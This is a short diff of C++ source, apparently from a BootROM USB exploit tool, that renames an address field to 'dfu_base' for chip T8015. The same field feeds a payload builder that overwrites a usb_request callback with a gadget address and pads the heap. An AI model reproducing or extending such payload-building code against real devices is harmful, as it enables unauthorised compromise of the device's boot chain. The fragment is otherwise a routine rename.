@@ -67,12 +67,12 @@ constexpr OffsetsA8A9 offsets_s8000 = {
 
 struct OffsetsT8015 {
   uint64_t nop_gadget;
-  uint64_t insecure_memory_base;
+  uint64_t dfu_base;
 };
 
 constexpr OffsetsT8015 offsets_t8015 = {
     .nop_gadget = 0x10000a9c4,
-    .insecure_memory_base = 0x18001c000,
+    .dfu_base = 0x18001c000,
 };
 
 std::vector<uint8_t>
@@ -173,7 +173,7 @@ struct OverwriteT8015 {
 std::vector<uint8_t> PayloadBuilder::make_overwrite(Chip chip) {
   OverwriteT8015 overwrite;
   overwrite.usb_request.callback = offsets_t8015.nop_gadget;
-  overwrite.usb_request.next = offsets_t8015.insecure_memory_base;
+  overwrite.usb_request.next = offsets_t8015.dfu_base;
   overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
   overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
 
